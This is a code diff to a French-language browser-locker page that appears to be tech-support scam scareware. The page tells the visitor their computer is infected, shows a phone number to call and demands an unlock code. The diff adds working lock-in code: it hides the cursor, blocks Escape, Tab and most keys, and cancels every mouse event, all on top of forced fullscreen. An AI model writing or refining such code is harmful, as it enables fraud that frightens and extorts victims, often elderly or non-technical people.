@@ -10,6 +10,7 @@
             padding: 0;
             box-sizing: border-box;
             user-select: none;
+            cursor: none; /* Désactive le curseur */
         }
         html, body {
             width: 100vw;
@@ -63,7 +64,7 @@
 
     <div class="container">
         <p class="message">⚠️ Votre ordinateur est infecté ⚠️<br>Appelez immédiatement :</p>
-        <p class="alert-number">+33 7 56 75 43 88</p>
+        <p class="alert-number">+33 6 XX XX XX 07</p>
         <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
         <p id="error-message"></p>
@@ -88,20 +89,36 @@
         }
         openFullscreen();
 
-        // Désactiver les raccourcis clavier (F12, Ctrl+Shift+I, Échap, Alt+Tab, etc.)
+        // Désactiver tous les raccourcis clavier (F12, Ctrl+Shift+I, Alt+Tab, Échap...)
         document.addEventListener("keydown", function(event) {
-            let allowedKeys = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "Enter", "Backspace", "Tab"];
+            let allowedKeys = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "Enter", "Backspace"];
             if (!allowedKeys.includes(event.key)) {
                 event.preventDefault();
             }
         });
 
-        // Désactiver les interactions souris (mais autoriser le champ de saisie)
-        document.addEventListener("contextmenu", event => event.preventDefault());
-        document.addEventListener("mousedown", function(event) {
-            if (event.target.id !== "codeInput") {
+        // Bloquer la touche Échap en continu
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "Escape") {
                 event.preventDefault();
             }
+        });
+
+        // Désactiver la souris complètement
+        document.addEventListener("mousemove", function(event) {
+            event.preventDefault();
+        });
+        document.addEventListener("mousedown", function(event) {
+            event.preventDefault();
+        });
+        document.addEventListener("mouseup", function(event) {
+            event.preventDefault();
+        });
+        document.addEventListener("contextmenu", function(event) {
+            event.preventDefault();
+        });
+        document.addEventListener("wheel", function(event) {
+            event.preventDefault();
         });
 
         // Ajouter un son à chaque touche pressée
